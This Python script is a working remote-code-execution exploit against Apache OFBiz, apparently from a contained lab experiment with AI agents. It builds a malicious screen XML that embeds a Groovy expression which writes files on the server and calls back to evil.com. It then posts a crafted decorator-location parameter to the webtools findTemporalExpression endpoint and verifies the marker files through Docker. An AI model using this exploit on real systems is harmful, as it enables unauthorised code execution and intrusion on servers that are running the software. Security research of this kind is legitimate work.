# -*- coding: utf-8 -*-
"""RT-4 OFBiz third shot: tree-write first, then hsperfdata marker, then callback."""
import io
import os
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

WWW = r"D:\Amywork\AgentSelf_Evolve\experiment\multi-round-lab\infrastructure\www\payloads"
G = "${groovy:"
SCRIPT = ("new File('/usr/src/apache-ofbiz/pwn_rt4_ofbiz_t2').setText('rt4');"
          "new File('/tmp/hsperfdata_root/pwn_rt4_ofbiz_a1').setText('rt4');"
          "new URL('http://evil.com:8000/rt/rt4_ofbiz_a3b').getText();")
xml = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
    '        xmlns="http://ofbiz.apache.org/Widget-Screen" '
    'xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen '
    'http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
    '    <screen name="TemporalExpressionDecorator">\n'
    '        <section>\n'
    '            <actions>\n'
    '                <set value="' + G + SCRIPT + '}"/>\n'
    '            </actions>\n'
    '        </section>\n'
    '    </screen>\n'
    '</screens>\n'
)
io.open(os.path.join(WWW, "rt4_ofbiz2.xml"), "w", encoding="utf-8", newline="\n").write(xml)
print("[+] payload written")

s = requests.Session()
s.trust_env = False
s.verify = False
s.headers["User-Agent"] = "Mozilla/5.0"
body = "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt4_ofbiz2.xml"
r = s.post("https://127.0.0.1:18081/webtools/control/main/findTemporalExpression", data=body,
           headers={"Content-Type": "application/x-www-form-urlencoded"},
           timeout=60, allow_redirects=False)
print("[*] HTTP %s (%dB)" % (r.status_code, len(r.content)))

for p in ("/usr/src/apache-ofbiz/pwn_rt4_ofbiz_t2", "/tmp/hsperfdata_root"):
    r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l", "--full-time", p],
                       capture_output=True, text=True)
    print(r.stdout + r.stderr)
r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "2m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "rt4" in line:
        print("[infra] " + line)
